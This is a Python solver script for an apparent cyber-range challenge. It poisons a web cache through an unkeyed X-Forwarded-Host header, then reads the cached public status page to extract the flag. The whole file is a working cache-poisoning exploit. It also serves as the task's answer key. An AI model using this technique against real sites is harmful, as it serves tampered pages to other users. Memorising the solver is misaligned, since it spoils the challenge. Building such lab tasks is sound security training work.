"""Intended-path solver: poison the unkeyed cache, then read the public page."""

import time

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

POISON_HEADERS = {"X-Forwarded-Host": "metrics.internal"}


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = "no attempts completed"
    captured = None
    for attempt in range(5):
        try:
            baseline = httpx.get(f"{base}/status", timeout=10)
            poisoned = httpx.get(f"{base}/status", headers=POISON_HEADERS, timeout=10)
            if "deploy-banner" not in poisoned.text:
                detail = f"attempt {attempt}: poison render did not include the banner"
                continue
            public = httpx.get(f"{base}/status", timeout=10)
            flags = find_flags(public.text)
        except Exception as exc:  # retry any transport hiccup
            detail = f"attempt {attempt}: {type(exc).__name__}"
            time.sleep(1)
            continue
        cached = "served-from-cache: true" in public.text
        if flags and cached:
            captured = flags[0]
            break
        detail = (
            f"attempt {attempt}: baseline_len={len(baseline.text)}, "
            f"public page flags={len(flags)}, cached={cached}"
        )
        time.sleep(1)
    return SolveResult(
        results=[
            TaskResult(
                task_id="poison-status-page",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else detail,
            )
        ]
    )
